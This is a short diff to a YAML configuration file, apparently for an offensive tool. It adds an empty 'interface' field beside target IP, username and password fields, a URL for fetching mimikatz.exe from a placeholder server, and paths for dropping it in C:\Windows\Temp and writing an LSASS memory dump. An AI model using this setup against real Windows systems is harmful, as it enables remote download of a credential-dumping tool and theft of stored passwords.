@@ -1,6 +1,7 @@
 target_ip: ""
 username: ""
 password: ""
+interface: ""
 mimikatz_url: "http://yourserver/mimikatz.exe"
 mimikatz_dest: "C:\\Windows\\Temp\\mimikatz.exe"
 lsass_dump_dest: "C:\\Windows\\Temp\\lsass.dmp"
